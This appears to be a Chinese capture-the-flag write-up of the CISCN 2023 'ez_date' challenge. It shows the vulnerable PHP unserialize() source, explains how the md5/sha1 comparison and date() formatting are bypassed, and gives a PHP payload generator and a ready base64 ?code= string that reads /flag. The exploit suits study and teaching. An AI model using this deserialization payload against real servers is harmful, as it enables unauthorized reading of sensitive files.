# 【CISCN 2023 华北】ez_date


# [CISCN 2023 华北]ez_date

## 思路
* 源码

  ```
   &lt;?php
  error_reporting(0);
  highlight_file(__FILE__);
  class date{
      public $a;
      public $b;
      public $file;
      public function __wakeup()
      {
          if(is_array($this-&gt;a)||is_array($this-&gt;b)){
              die(&#39;no array&#39;);
          }
          if( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) ){
              $content=date($this-&gt;file);
              $uuid=uniqid().&#39;.txt&#39;;
              file_put_contents($uuid,$content);
              $data=preg_replace(&#39;/((\s)*(\n)&#43;(\s)*)/i&#39;,&#39;&#39;,file_get_contents($uuid));
              echo file_get_contents($data);
          }
          else{
              die();
          }
      }
  }
  
  unserialize(base64_decode($_GET[&#39;code&#39;])); 
  ```

* `is_array($this-&gt;a)||is_array($this-&gt;b)`：这里不能使用数组绕过

* `($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b))`：需要绕过===

  * 解决：`a=1`和`b=&#39;1&#39;`可以绕过

* 读取文件的名字绕过

  ```
  $content=date($this-&gt;file);
  $uuid=uniqid().&#39;.txt&#39;;
  file_put_contents($uuid,$content);
  $data=preg_replace(&#39;/((\s)*(\n)&#43;(\s)*)/i&#39;,&#39;&#39;,file_get_contents($uuid));
  ```

  * `date()`

    该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等

    检测存在则会将格式化字符替换为当前时间的对应部分，**否则将字符进行原样输出**，同时可用转义字符将格式化字符原样输出

  * `uniqid()`

    生成一个时间戳，将生成的时间戳拼接.txt给$uuid

  * `preg_replace(&#39;/((\s)*(\n)&#43;(\s)*)/i&#39;,&#39;&#39;`

    1. 开头的`/`和`i`前的`\`表示正则表达式语法的开始和结束
    2. `(\s)*` ：匹配零个或多个**空白字符**（空格、制表符等）
    3. `(\n)&#43;` ：匹配一个或多个**换行符**
    4. `(\s)*` ：再次匹配零个或多个**空白字符**
    5. `i` ：修饰符，表示**不区分大小写**

  * `file_get_contents()`

    | path         | 必需。规定要读取的文件。                                     |
    | ------------ | ------------------------------------------------------------ |
    | include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#39;1&#39;。 |
    | context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 |
    | start        | 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 |
    | max_length   | 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。          |

  我们要读flag文件那猜测最常见在/flag，我们可以看一下那个date格式化把flag搞成啥样。

  因为如果不会被替换的部分会直接原样输出。

  ```
  &lt;?php
  $a=&#39;/flag&#39;;
  print(date($a));
  ?&gt;
  ```

  输出结果为：/fWednesdayam10

  说明f、l、a、g都被替换，因此使用转义符防止被替换

  即`/f\l\a\g`

## Payload

```
&lt;?php
class date{
    public $a;
    public $b;
    public $file;
    public function __wakeup()
    {
        if(is_array($this-&gt;a)||is_array($this-&gt;b)){
            die(&#39;no array&#39;);
        }
        if( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) ){
            echo &#39;aaa&#39;;
            $content=date($this-&gt;file);
            $uuid=uniqid().&#39;.txt&#39;;
            file_put_contents($uuid,$content);
            $data=preg_replace(&#39;/((\s)*(\n)&#43;(\s)*)/i&#39;,&#39;&#39;,file_get_contents($uuid));
            echo file_get_contents($data);
        }
        else{
            die();
        }
    }
}

//unserialize(base64_decode($_GET[&#39;code&#39;]));
$f = new date();
$f-&gt;a = 1;
$f-&gt;b = &#39;1&#39;;
$f-&gt;file = &#34;/f\l\a\g&#34;;
echo urlencode(base64_encode(serialize($f)));
```

```
?code=Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9
```

## 总结
* php反序列化
* md5绕过
* 文件读取

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2023-%E5%8D%8E%E5%8C%97ez_date/  

